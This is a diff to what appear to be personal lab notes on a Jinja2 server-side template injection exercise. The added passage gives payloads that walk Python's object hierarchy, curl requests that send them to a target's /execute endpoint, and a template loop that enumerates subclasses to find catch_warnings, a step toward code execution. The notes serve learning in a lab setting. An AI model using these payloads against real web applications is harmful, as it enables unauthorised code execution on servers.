@@ -921,3 +921,40 @@ we have found the import function by walking the hierarchy, this means that we c
 
 ![](Images/Pasted%20image%2020240214115948.png)
 
+now in our web browser we can use the payload: 
+
+`{{ ''.__class__ }}`
+
+```shell
+curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
+```
+
+![](Images/Pasted%20image%2020240214180344.png)
+
+we can see that we want the second item in this list so now we can modify our payload to be: 
+
+`{{ ''.__class__.__mro__[1] }}`
+
+`curl -gs "http://94.237.58.211:41086/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D%20%7D%7D"`
+
+![](Images/Pasted%20image%2020240214180605.png)
+
+then we can start walking the hierarchy with: 
+
+`{{ ''.__class__.__mro__[1].__subclasses__() }}`
+
+![](Images/Pasted%20image%2020240214180737.png)
+
+then we can print out the number and the method names using a new payload: 
+
+```python
+{% for i in range(450) %} 
+{{ i }}
+{{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }} 
+{% endfor %}
+```
+
+![](Images/Pasted%20image%2020240214180903.png)
+
+in this list we can find `catch_warnings` at index 214
+
